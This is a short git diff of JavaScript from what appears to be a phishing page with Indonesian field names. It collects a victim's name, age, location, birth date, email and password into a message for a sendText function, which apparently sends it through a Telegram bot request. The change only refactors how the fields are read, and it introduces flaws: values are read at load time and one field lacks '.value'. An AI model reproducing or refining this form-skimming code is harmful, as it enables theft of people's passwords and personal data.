@@ -57,14 +57,14 @@ async function telegramRequest(method, data) {
   }
 }
 
-var nama = document.getElementById('nama');
-var umur = document.getElementById('umur');
-var alamat = document.getElementById('lokasi');
-var tgl_lahir = document.getElementById('tgl_lahir')
-var email = document.getElementById('email');
-var kata_sandi = document.getElementById('kata_sandi');
+var nama = document.querySelector('#nama').value;
+var umur = document.querySelector('#umur').value;
+var alamat = document.querySelector('#lokasi').value;
+var tgl_lahir = document.querySelector('#tgl_lahir')
+var email = document.querySelector('#email').value;
+var kata_sandi = document.querySelector('#kata_sandi').value;
 
-var result = "\nNama : " + nama.value + "\nUmur : " + umur.value + " Tahun" + "\nLokasi : " + alamat.value + "\nEmail : " + email.value + "\nKata Sandi : " + kata_sandi.value;
+var result = "\nNama : " + nama + "\nUmur : " + umur + " Tahun" + "\nLokasi : " + alamat + "\nEmail : " + email + "\nKata Sandi : " + kata_sandi;
 
 function sendText() {
   const message = result;
